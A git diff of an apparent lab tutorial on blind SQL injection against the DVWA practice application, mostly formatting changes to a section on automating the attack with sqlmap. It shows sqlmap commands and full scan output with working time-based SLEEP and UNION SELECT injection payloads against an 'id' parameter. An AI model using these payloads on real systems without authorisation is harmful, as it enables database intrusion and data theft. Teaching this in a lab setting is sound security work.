@@ -183,6 +183,8 @@ The OR statement returned a SQLi result. That result from the OR statement is un
 These statements confirm that the application is vulnerable to SQLi.
 
 ## Automating Blind SQLi with sqlmap
+### Challenge 2: Detect the DBMS and Confirm SQLi Vulnerability
+
 Start with a basic scan, but first flush and purge sqlmap's cache.
 
 ```
@@ -204,7 +206,8 @@ sqlmap --flush-session --purge
 
 ```
 Now, start a new attack.
-```
+
+<pre>
 sqlmap -r dvwa-b.txt                
         ___
        __H__                                                                                              
@@ -218,7 +221,7 @@ sqlmap -r dvwa-b.txt
 [*] starting @ 08:13:25 /2022-11-15/
 
 [08:13:25] [INFO] parsing HTTP request from 'dvwa-b.txt'
-[08:13:25] [INFO] testing connection to the target URL
+<b>[08:13:25] [INFO] testing connection to the target URL</b>
 [08:13:25] [INFO] checking if the target is protected by some kind of WAF/IPS
 [08:13:26] [INFO] testing if the target URL content is stable
 [08:13:26] [INFO] target URL content is stable
@@ -236,8 +239,8 @@ sqlmap -r dvwa-b.txt
 [08:13:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
 [08:13:46] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
 [08:13:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
-[08:13:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
-[08:14:02] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+<b>[08:13:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:14:02] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable </b>
 it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
 for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
 [08:15:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
@@ -248,14 +251,14 @@ for the remaining tests, do you want to include all tests for 'MySQL' extending 
 GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
 sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
 ---
-Parameter: id (GET)
+<b>Parameter: id (GET)
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: id=100 AND (SELECT 4544 FROM (SELECT(SLEEP(5)))tHeh)&Submit=Submit
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 2 columns
-    Payload: id=100 UNION ALL SELECT NULL,CONCAT(0x71626b6271,0x705464434841515a6d76724241654f694e477a7552746b4f45717a7641435758487a614c576c4143,0x717a7a7171)-- -&Submit=Submit
+    Payload: id=100 UNION ALL SELECT NULL,CONCAT(0x71626b6271,0x705464434841515a6d76724241654f694e477a7552746b4f45717a7641435758487a614c576c4143,0x717a7a7171)-- -&Submit=Submit</b>
 ---
 [08:16:03] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
@@ -265,4 +268,4 @@ back-end DBMS: MySQL >= 5.0.12
 
 [*] ending @ 08:16:06 /2022-11-15/
 
-```
+</pre>
